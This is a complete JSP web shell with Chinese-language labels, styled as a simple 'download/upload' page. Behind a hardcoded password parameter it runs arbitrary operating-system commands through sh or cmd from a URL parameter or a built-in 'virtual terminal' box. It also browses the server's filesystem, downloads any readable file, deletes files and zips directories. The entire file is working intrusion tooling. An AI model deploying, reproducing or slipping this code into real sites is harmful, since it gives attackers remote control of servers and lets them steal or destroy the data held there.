<%@page import="java.io.*" contentType="text/html; charset=UTF-8" %>
<%@page import="java.util.zip.*" contentType="text/html; charset=UTF-8" %>
<%@page import="java.lang.StringBuilder" contentType="text/html; charset=UTF-8" %>
<%@page import="java.net.URLDecoder" contentType="text/html; charset=UTF-8" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <title>download/upload</title>
</head>
<body style="margin: 0; padding: 0;">
<%!
    void recursionZip(ZipOutputStream zipOut, File file, String baseDir) throws Exception {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File fileSec : files) {
                recursionZip(zipOut, fileSec, baseDir + file.getName() + File.separator);
            }
        } else {
            byte[] buf = new byte[1024];
            InputStream input = new FileInputStream(file);
            zipOut.putNextEntry(new ZipEntry(baseDir + file.getName()));
            System.out.println(file + "压缩成功！");
            int len;
            while ((len = input.read(buf)) != -1) {
                zipOut.write(buf, 0, len);
            }
            input.close();
        }
    }

    boolean zip(String filepath, String zipPath) {
        try {
            File file = new File(filepath);// 要被压缩的文件夹
            File zipFile = new File(zipPath);
            ZipOutputStream zipOut = new ZipOutputStream(new FileOutputStream(zipFile));
            if (file.isDirectory()) {
                File[] files = file.listFiles();
                for (File fileSec : files) {
                    if (!fileSec.getAbsolutePath().equals(zipFile.getAbsolutePath()))
                        recursionZip(zipOut, fileSec, file.getName() + File.separator);
                }
            } else {
                recursionZip(zipOut, file, "");
            }
            zipOut.close();
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    void copyStream(final InputStream[] ins, final JspWriter out) {
        for(InputStream in: ins){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    if(in == null) return;
                    try {
                        int a = -1;
                        byte[] b = new byte[2048];
                        while ((a = in.read(b)) != -1) {
                            out.println(new String(b));
                            out.flush();
                        }
                    } catch (Exception e) {                  
                        
                    } finally{
                        try {
                            if(in != null ) in.close();
                        } catch (Exception ec) { 
                            
                        }     
                    }
                }
            }).start();
        }
    }

    String getCurrentPath(String file, String p, String url) throws IOException {
        String path = "";
        String tmpFile = file.replaceAll("/[^/]+/?$", "/");
        while (!file.equals(tmpFile)) {
            path = "<a href='" + url + "?p=" + p + "&f=" + file + "'>" + file.replaceAll(tmpFile, "") + "</a>" + path;
            file = tmpFile;
            tmpFile = file.replaceAll("/[^/]+/?$", "/");
        }
        path = "<a href='" + url + "?p=" + p + "&f=" + file + "'>" + file + "</a>" + path;
        return path;
    }
%>

<%
    //验证用户名
    response.setCharacterEncoding("UTF-8");    
    String url = request.getRequestURL().toString();
    String p = request.getParameter("p");
    String dp = "ruphy";
    if (!dp.equals(p)) {        
        if(!"true".equals(request.getParameter("c"))){
            out.println("<div style='text-align: center;'>访问失败！<span style='color: red'>密码错误！</span></div>");
            out.println("<div style='text-align: center;'><span>usage: <a style='color: black' href='" + url + "?p=passwd&f=path' >" + url + "?p=passwd&f=path</a></span></div>");
            out.println("<div style='text-align: center; color: blue'>@copyright by ruphy.</div>");
        }
        return;
    }
    String m = request.getParameter("m");
    if (m != null && !"".equals(m.trim())) {
        out.println("开始执行命令: " + m);
        out.flush();
        String[] cmds = new String[]{"sh", "-c", m};
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            cmds = new String[]{"cmd", "/k", m};
        }
        Process ps = null;
        out.print("<xmp>");
        try {
            ps = Runtime.getRuntime().exec(cmds);           
            copyStream(new InputStream[]{ps.getInputStream(),ps.getErrorStream()}, out);
            ps.getOutputStream().close();
            ps.waitFor();
        } catch (Exception e) {                  
            out.println("<div>执行命令 " + m + " 发生错误!</div>");
        } finally{
            try {
                if(ps != null) ps.destroy();
            } catch (Exception ec) { 
                out.println("关闭流出错！");
             }     
        }
        out.println("</xmp>");
        out.println("<div>执行命令: " + m + " 完成!</div>");
        return;
    }
    String fn = request.getParameter("f");
    if (fn == null || "".equals(fn.trim())) {
        fn = application.getRealPath("/");
    }
    String f = fn.replaceAll("\\\\+", "/").replaceAll("/+", "/");
    File file = new File(f);
    if(!file.exists()){
        out.println("目录或者文件不存在！");
        return;
    }
    if ("true".equals(request.getParameter("t"))) {
        if (zip(f, new File(f).getAbsolutePath() + ".zip")) {
            out.println("<script>alert('压缩成功!');location.href=location.href.replace(\"&t=true\", \"\").replace(/\\/[^\\/]+$/, '');</script>");
        }
        out.println("<script>alert('压缩失败');location.href=location.href.replace(\"&t=true\", \"\").replace(/\\/[^\\/]+$/, '');</script>");
        return;
    }
    if (file.isDirectory() && file.canRead()) {
        StringBuilder sb = new StringBuilder();
        File[] files = file.listFiles();
        sb.append("<div style='margin: 20px'>当前目录：" + getCurrentPath(f, dp, url)
                + "<a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&f=" + f.replaceAll("/[^/]+/?$", "/") + "\">返回上级目录</a>"
                + "</div>");  
        sb.append("<div style='max-height: 450px; overflow: auto; background-color: #ffe;'><table><tbody>");
        for (int i = 0; i < files.length; i++) {
            if (files[i].canRead()) {
                sb.append("<tr>"
                        + "<td><a style=\"margin-left: 20px;\" href='" + url + "?p=" + dp + "&f=" + f + "/" + files[i].getName() + "'>" + f.replaceAll("/+$", "") + "/" + files[i].getName() + "</a></td>"
                        + "<td><a style=\"margin-left: 20px;\" onclick='return confirm(\"are you sure?\")' href=\"" + url + "?p=" + dp + "&r=true&f=" + f + "/" + files[i].getName() + "\">删除</a></td>"
                        + (!files[i].isFile() ? "<td></td>" : "<td><a style=\"margin-left: 20px;\" onclick=\"top.document.getElementById('view-file').setAttribute('src', '" + url + "?p=ruphy&v=true&f=" + f + "/" + files[i].getName() + "');\" href=\"#\">查看</a></td>")
                        + "<td><a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&t=true&f=" + f + "/" + files[i].getName() + "\">压缩</a>"
                        + "<td><a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&f=" + f.replaceAll("/.+/?$", "/") + "\">返回上级目录</a>"
                        + "<span style=\"margin-left: 20px\">" + files[i].length() / 1024 + "KB(" + files[i].length() / 1024 / 1024 + "MB)</span></td>"
                        + "</tr>");
            }
        }    
        sb.append("</tbody></table></div>");
        sb.append("<div style='background-color: #ccc;'>");
        sb.append("<div style='margin: 20px'>虚拟终端：<input id='command' type='text' value='netstat -an' style='width: 250px;border: none;color: red;background-color: black;'/>"
                + "<a style='color: blue' onclick=\"var m= top.document.getElementById('command').value;if(!m) return false; top.document.getElementById('view-file').setAttribute('src', '" + url + "?p=ruphy&m=' + encodeURIComponent(m));\" href=\"#\">执行</a>"
                + "</div>");
        sb.append("<div style='margin-top: 20px; padding: 5px; height: 500px'>"
                + "<iframe id='view-file' src='" + url + "?c=true' height='100%' style='width: 100%; height: 100%' frameborder='0'></iframe>"
                + "</div>");
        sb.append("</div>");
        out.println(sb.toString());
        out.println("<div style='text-align: center;'><span>usage: <a style='color: black' href='" + url + "' >" + url + "</a></span></div>");
        out.println("<div style='text-align: center; color: blue'>@copyright by ruphy.</div>");
        return;
    }
    if ("true".equals(request.getParameter("r"))) {
        if (file.delete()) {
            out.println("<script>alert('删除成功！');location.href=location.href.replace(\"&r=true\", \"\").replace(/\\/[^\\/]+$/, '');</script>");
        }
        out.println("<script>alert('删除失败！');location.href=location.href.replace(\"&r=true\", \"\").replace(/\\/[^\\/]+$/, '');</script>");
        return;
    }
    if (!"true".equals(request.getParameter("v"))) {
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition", "attachment; filename=" + f.replaceAll(".+/+", "").replace(" ", "_"));
    } else if (file.length() > 1024 * 1024 * 10) {
        out.println("文件太大，请下载查看!");
        return;
    }
    OutputStream streamOut = response.getOutputStream();
    InputStream streamIn = new FileInputStream(file);
    int length = streamIn.available();
    int bytesRead = 0;
    byte[] buffer = new byte[1024];
    while ((bytesRead = streamIn.read(buffer, 0, 1024)) != -1) {
        streamOut.write(buffer, 0, bytesRead);
    }
    response.flushBuffer();
    streamIn.close();
    streamOut.close();
%>
</body>
</html>